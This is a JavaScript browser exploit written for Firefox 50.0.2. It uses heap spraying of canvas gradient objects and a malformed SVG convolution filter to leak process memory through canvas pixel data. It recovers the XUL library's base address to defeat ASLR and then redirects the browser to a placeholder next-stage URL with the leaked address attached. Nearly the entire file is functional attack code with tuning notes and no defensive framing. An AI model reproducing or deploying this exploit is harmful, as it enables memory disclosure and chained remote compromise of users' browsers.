/*NOTE: This is only for version 50.0.2, to try and make it work on other versions, fix this.*/
const g_SIZEOF_LINEAR_GRADIENT = 0x50;
const g_vt_to_empty_offset = 0x28 / 4; /*Delta between the empty recored and the VT in LinearGradient class*/
const g_vt_to_emtpy_delta = -0x902d8; /*Delta in the real file (meaning the delta of the addresses)*/
const g_xul_offset_to_vt = 0x4843ef0; /*Delta from the vt to the start of XUL*/

/*NOTE: at x86 I would recommend doing a g_IMG_SIZE of 75/85..*/
var g_IMG_SIZE = 100;
/*NOTE: This is true for matrix size of size 100x100: */
const g_size_of_allocation = 0x640f;
const g_objects_to_spray = 50000;

/* Number of times trying to leak per reload
	Increasing that slightly increases the chance for the info leak
	but also slightly increases the chance for a crash */
var g_TIMES_TO_TRIGGER = 50;

/*Play around with this if you want to try to exploit quicker or raise the % of success.*/
const g_TIMEOUT_VALUE = 10000;

var g_cycleCollector = 0x3 * 2;
var g_cycleCollectorLowerByteAndAHalf = 0xd28;
var g_cycleCollectorOffsetToStart = 0x4843d28;


var g_NEXT_STAGE_URL = "NEXTSTAGEURLPLEASE";

function next_stage(xul_base_address) {
	/*Move to next stage*/
	location.href = g_NEXT_STAGE_URL + xul_base_address.toString(16);
}

function create_empty_canvas(w, h, opaque) {
	var my_can = document.createElement("canvas");
	my_can.width = w;
	my_can.height = h;
	my_can.mozOpaque = opaque;
	var my_ctx = my_can.getContext("2d");
	my_ctx.fillStyle = 'rgba(0, 0, 0, 0)';
	my_ctx.fillRect(0, 0, my_can.width, my_can.height);

	return my_can;
}

function clear_canvas(my_can) {
	var ctx = my_can.getContext("2d");
	ctx.fillStyle = 'rgba(0, 0, 0, 0)';
	ctx.fillRect(0, 0, my_can.width, my_can.height);
}

const MB = 0x100000;
const ALLOC_TIMES = 3;
function force_major_gc() {
	const maxMallocBytes = 8 * 64 * MB;
	for (var i = 0; i < ALLOC_TIMES; ++i) {
		var x = new ArrayBuffer(maxMallocBytes);
	}
}

function preAllocArray(size_to_alloc) {
	var ret_array = new Array(2);
	ret_array[0] = 0xBABE5555;
	ret_array[1] = ret_array;

	while (ret_array.length < size_to_alloc) {
		ret_array = ret_array.concat(ret_array);
	}

	ret_array.splice(ret_array.length - size_to_alloc, ret_array.length - size_to_alloc);

	return ret_array;
}

/*this is just a canvas for the spray..*/
var g_linear_CANVAS_TO_SPRAY = document.createElement("canvas");
var g_linear_CTX_TO_SPRAY = g_linear_CANVAS_TO_SPRAY.getContext('2d');
var g_helper_array_for_splice = null;

function linear_gradient_creator() {
	return g_linear_CTX_TO_SPRAY.createLinearGradient(0, 0, 0, 0);
}

function clear_full_item(conainter, cur_i, objects_per_item) {
	for (var i = cur_i ; i < cur_i + objects_per_item; ++i) {
		conainter[i] = null;
	}
}

var g_object_spray_array = null;
function spray_any_object(item_size, times_to_spray, creating_func, object_size) {
	var objects_per_item = Math.ceil(item_size / object_size);
	var container_length = times_to_spray * objects_per_item;

	g_object_spray_array = preAllocArray(container_length);
	if (container_length != g_object_spray_array.length) {
		return;
	}

	for (var i = 0; i < container_length; i += objects_per_item) {
		for (var j = 0; j < objects_per_item; ++j) {
			g_object_spray_array[i + j] = creating_func();
		}
	}

	g_linear_CTX_TO_SPRAY = null;
	g_linear_CANVAS_TO_SPRAY = null;
	for (var i = Math.ceil((container_length / 3) * 2); i < container_length; i += (objects_per_item * 2)) {
		clear_full_item(g_object_spray_array, i, objects_per_item);
	}

	return g_object_spray_array;
}

var g_vt_addr = 0;
var g_sEmptryHdr_addr = 0;
function findCanvasGradientCycleCollector(addresses_arrayBuffer) {
	var dword_view_of_address = new Uint32Array(addresses_arrayBuffer);

	for (var i = 0; i < dword_view_of_address.length - g_cycleCollector - 1; ++i) {
		if (dword_view_of_address[i] == 0 || dword_view_of_address[i + g_cycleCollector] == 0) {
			continue;
		}

		var first_qword = new Long(dword_view_of_address[i], dword_view_of_address[i + 1], true);
		var second_qword = new Long(dword_view_of_address[i + g_cycleCollector], dword_view_of_address[i + g_cycleCollector + 1]);

		if (!first_qword.eq(second_qword)) {
			continue;
		}

		if (g_cycleCollectorLowerByteAndAHalf == (dword_view_of_address[i] & 0x00000fff)) {
			return first_qword.sub(g_cycleCollectorOffsetToStart);
		}
	}
	return null;
}

function findCanavasGradientVT(addresses_arrayBuffer) {
	var dword_view_of_address = new Uint32Array(addresses_arrayBuffer);
	var correct_dword_index = null;
	var vt_address_long = null;
	var emptyHdr_address_long = null;
	for (var i = 0; i < dword_view_of_address.length - g_vt_to_empty_offset - 1; ++i) {
		if(dword_view_of_address[i] == 0 | dword_view_of_address[i + g_vt_to_empty_offset] == 0) {
			continue;
		}
		if ((dword_view_of_address[i] - dword_view_of_address[i + g_vt_to_empty_offset]) == g_vt_to_emtpy_delta) {
			/*Just make sure, when using long*/
			vt_address_long = new Long(dword_view_of_address[i], dword_view_of_address[i + 1], true);
			emptyHdr_address_long = new Long(dword_view_of_address[i + g_vt_to_empty_offset], dword_view_of_address[i + g_vt_to_empty_offset + 1], true);
			if (emptyHdr_address_long.sub(vt_address_long).eq(-g_vt_to_emtpy_delta)) {
				correct_dword_index = i;
				break;
			} else {
				vt_address_long = null;
				emptyHdr_address_long = null;
			}
			correct_dword_index = i;
			break;
		}
	}

	if ((null == correct_dword_index) || (null == vt_address_long))  {
		return null;
	}

	return vt_address_long.sub(g_xul_offset_to_vt);
}

function findBaseAddress(addresses_arrayBuffer) {
	var xul_base = null;
	xul_base = findCanavasGradientVT(addresses_arrayBuffer);
	if (xul_base != null) {
		return xul_base;
	}

	return findCanvasGradientCycleCollector(addresses_arrayBuffer);
}

/*this is canvas to leak the RGB*/
var g_leaker_canvas = null;
var g_leaker_cntx = null;
var g_leaker_DOMURL = window.URL || window.webkitURL || window;
var g_leaker_img = new Image();
var g_leaker_url = null;
function img_lower_bytes_ready() {
	/*first we must paint the img*/
	g_leaker_cntx.drawImage(g_leaker_img, 0, 0);
	/*Now we've got g_leaker_ctx what holds the correrct RGB bytes and g_ctx that has only the opacity byte right.
	  We are going to use g_ctx (the original ctx) to leak only the opacity byte.
	  We are going to use g_leaker_cntx to leak only the RGB bytes (mozopaque set to true, meaning the opacity will only be 255)*/
	var good_rgb_data = g_leaker_cntx.getImageData(0, 0, g_leaker_canvas.width, g_leaker_canvas.height).data
	var good_opacity_data = g_ctx.getImageData(0, 0, g_canvas.width, g_canvas.height).data;
	if (good_rgb_data.length != good_opacity_data.length) {
		return;
	}

	var addresses_arrayBuffer = new ArrayBuffer(good_rgb_data.length);
	var bytes_view_of_addresses = new Uint8Array(addresses_arrayBuffer);
	for (var i = 0; i < good_rgb_data.length; i += 4) {
		bytes_view_of_addresses[i] = good_rgb_data[i + 2];
		bytes_view_of_addresses[i + 1] = good_rgb_data[i + 1];
		bytes_view_of_addresses[i + 2] = good_rgb_data[i];
		bytes_view_of_addresses[i + 3] = good_opacity_data[i + 3];
	}

	/*now addresses_arrayBuffer is supposed to have addresses like a boss :)*/
	/*call here*/
	var xul_base_address = findBaseAddress(addresses_arrayBuffer);

	if (null == xul_base_address) {
		trigger(false);
	}

	/*We've found it, let calc the XUL's base and go onto the next page*/
	next_stage(xul_base_address);
}

function lower_bytes_blob(my_blob) {
	/*create a canvas with mozopaque set to true*/
	g_leaker_canvas = create_empty_canvas(g_IMG_SIZE, g_IMG_SIZE, true);
	g_leaker_cntx = g_leaker_canvas.getContext("2d");
	g_leaker_url = g_leaker_DOMURL.createObjectURL(my_blob);
	/*once the image gets loaded, this will be called */
	g_leaker_img.onload = img_lower_bytes_ready;
	g_leaker_img.src = g_leaker_url;
}
function read_addresses(my_leaked_cavans) {
	/*lower_bytes_blob will get called. This is our way of leaking the RGB part of the pixels*/
	my_leaked_cavans.toBlob(lower_bytes_blob, "image/bmp", 1);
}

/*Using color-interpolation-filters="sRGB" so our pixels won't go though another manipulation*/
var g_img_data ='<svg xmlns="http://www.w3.org/2000/svg" width="' + g_IMG_SIZE.toString() + '" height="' + g_IMG_SIZE.toString() + '" filter="url(#f)">' +
				'<rect x="0" y="0" width="' + g_IMG_SIZE.toString() + '" height="' + g_IMG_SIZE.toString() + '" style="fill:rgba(0,0,0,0)"/>' +
				'<defs>' +
				'<filter id="f" color-interpolation-filters="sRGB" filterUnits="userSpaceOnUse"' + ' width="' + g_IMG_SIZE.toString() + '"' + ' height="' + g_IMG_SIZE.toString() +'"' + ' filterRes="' + g_IMG_SIZE.toString() + ' ' + g_IMG_SIZE.toString() + '"' + '>' +
				'<feConvolveMatrix color-interpolation-filters="sRGB" kernelMatrix="1 0 0 0 2 0 0 0 0" kernelUnitLength="-1 -1" bias="0" divisor="1" edgeMode="none" targetX="1" targetY="1"' + ' width="' + g_IMG_SIZE.toString() + '"' + ' height="' + g_IMG_SIZE.toString() +'"' + '/>' +
				'</filter>' +
				'</defs>' +
				'</svg>';

var g_DOMURL = window.URL || window.webkitURL || window;
var g_img = null;
var g_faulty_svg_blob = null;
var g_url = null;
var g_url_data_for_me = null;
function exploit_now() {
	g_ctx.drawImage(g_img, 0, 0);
	post_exploit();
}

var g_canvas = null;
var g_ctx = null;
function leak_callback() {
	pre_exploit();
	setTimeout(exploit_now, g_TIMEOUT_VALUE);
}

function trigger(should_spray = true) {
	if (g_TIMES_TO_TRIGGER < 0) {
		location.reload();
		return;
	}

	clear_canvas(g_canvas);
	g_img = new Image();
	g_faulty_svg_blob = new Blob([g_img_data], {type:'image/svg+xml'});
	g_url = g_DOMURL.createObjectURL(g_faulty_svg_blob);
	--g_TIMES_TO_TRIGGER;

	if (should_spray) {
		g_img.onload = leak_callback;
	} else {
		g_img.onload = exploit_now;
	}

	g_img.src = g_url;
}

/*linear gradient*/
var g_spray_function = linear_gradient_creator;
var g_spray_object_size = g_SIZEOF_LINEAR_GRADIENT;
var g_TIMES_TO_SPRAY = 1;
var g_MAJOR_GC_TIMES = 1;
function pre_exploit() {
	if (g_MAJOR_GC_TIMES > 0) {
		force_major_gc();
	}
	if (g_TIMES_TO_SPRAY > 0) {
		spray_any_object(g_size_of_allocation, g_objects_to_spray, g_spray_function, g_spray_object_size);
		--g_TIMES_TO_SPRAY;
	}

	if (g_MAJOR_GC_TIMES > 0) {
		--g_MAJOR_GC_TIMES;
		force_major_gc();
	}

	return;
}

function post_exploit() {
	read_addresses(g_canvas);
}

function make_animation() {
	var body_ele = document.getElementsByTagName("body");
	body_ele = body_ele[0];

	var svg_ele = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
	var rect_ele = document.createElementNS('http://www.w3.org/2000/svg', 'rect');

	rect_ele.setAttribute("width", 1);
	rect_ele.setAttribute("height", 1);
	rect_ele.setAttribute("x", 0);
	rect_ele.setAttribute("y", 0);
	rect_ele.setAttribute("id", "anirect");
	rect_ele.setAttribute("style", "fill:black");

	svg_ele.appendChild(rect_ele);
	svg_ele.setAttribute("width", "1");
	svg_ele.setAttribute("height", "1");
	svg_ele.setAttribute("viewPort", "0 0 1 1");
	svg_ele.setAttribute("version", "1.1");
	svg_ele.setAttribute("xmlns", "http://www.w3.org/2000/svg");

	body_ele.appendChild(svg_ele);

	rect_ele.animate([ {opacity: 1, easing: 'ease-out' }, {opacity: 0.1, easing: 'ease-in' }, {opacity: 0} ], {duration: 500, iterations: Infinity});
}

function main() {
	var ani_svg_now = document.getElementById('anirect2')
	ani_svg_now.animate([ {opacity: 1, easing: 'ease-out' }, {opacity: 0.1, easing: 'ease-in' }, {opacity: 0} ], {duration: 500, iterations: Infinity});
	make_animation();
	g_canvas = create_empty_canvas(g_IMG_SIZE, g_IMG_SIZE, false);
	g_ctx = g_canvas.getContext("2d");
	trigger();
}

window.onload = main
